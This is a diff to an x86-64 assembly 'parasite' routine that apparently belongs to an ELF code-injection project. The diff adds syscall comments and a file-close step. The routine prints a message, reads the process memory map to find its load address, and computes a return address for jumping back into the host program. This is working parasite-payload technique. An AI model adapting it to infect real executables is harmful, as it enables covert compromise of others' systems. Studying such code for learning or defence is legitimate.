@@ -29,6 +29,7 @@ SYS_WRITE   equ 0x1         ; 1
 SYS_EXIT    equ 0x3c        ; 60
 SYS_READ    equ 0x0         ; 0
 SYS_OPEN    equ 0x2         ; 2
+SYS_CLOSE   equ 0x3         ; 3
 SYS_LSEEK   equ 0x8         ; 8
 SYS_EXECVE  equ 0x3b        ; 59
 ALLOC_SPACE equ 0x20		; 16 bytes
@@ -56,8 +57,11 @@ _start:
 parasite:
 
 	; Print our message
+	; %rax      | %rdi | %rsi | %rdx
+	; sys_write	|  fd  | *buf | count
+
 	xor	rax, rax					; Zero out RAX
-	add	rax, 0x1					; Syscall number of write() - 0x1
+	add	rax, SYS_WRITE				; Syscall number of write() - 0x1
 	mov rdi, rax					; File descriptor - 0x1 (STDOUT)
 	lea rsi, [rel message]			; Addresses the label relative to RIP (Instruction Pointer), i.e. 
 									; dynamically identifying the address of the 'message' label.
@@ -67,7 +71,10 @@ parasite:
 
 
 	; open file in memory
-	; int open(const char *pathname, int flags)		
+	; %rax      |   %rdi    | %rsi  | %rdx
+	; sys_open  | *filename | flags | mode
+	; return fd -> %eax
+
 	xor rax, rax
 	xor rdi, rdi
 	lea	rdi, [rel filepath] 	; pathname
@@ -75,19 +82,13 @@ parasite:
 	mov al, SYS_OPEN			; syscall number for open()
 	syscall
 
-
-
-; RBX stores the address where the binary is loaded
 ;--------------------------------------------------------------------
 
-    ; AL stores the fd returned by open() syscall
-    ; ssize_t read(int fd, void *buf, size_t count);
-    ; 
     xor r10, r10                ; Zeroing out temporary registers
     xor r8, r8
     xor rdi, rdi
     xor rbx, rbx
-    mov dil, al                 ; fd    : al
+    mov dil, al
     sub sp, ALLOC_SPACE         ; allocate space for /proc/<pid>/maps memory address string 
                                 ; (Max 16 chars from file | usually 12 chars 5567f9154000)
     lea rsi, [rsp]              ; *buf  : get the content to be read on stack
@@ -96,12 +97,14 @@ parasite:
     xor rax, rax
 
 
-
 ; R10 to store count of chars before '-' in /proc/self/maps
 ; R8 to store the extracted digit/alphabet
 ; Don't change RAX, RDI, RSI, RDX registers.
 ; RBX will store the final result (the address computed)
 read_characters:
+	; %rax      | %rdi | %rsi | %rdx
+	; sys_read  |  fd  | *buf | count
+
     xor rax, rax                ; Syscall Number for read : 0x0
     syscall                     ; Byte read at [rsp]
     cmp BYTE [rsp], 0x2d		; if read_byte == 0x2d ('-')
@@ -142,9 +145,16 @@ done:
     mov r10, 0xAAAAAAAAAAAAAAAA
     add r8, r10                 ; Computing final jmp-on-exit address
 
-	
 
 ;-------------------------------------------------------------------
+
+close_file:
+	; %rax      | %rdi
+	; sys_close |  fd
+
+	xor rax, rax
+	mov rax, SYS_CLOSE
+	syscall
 
 
 address_loaded_in_RBX:
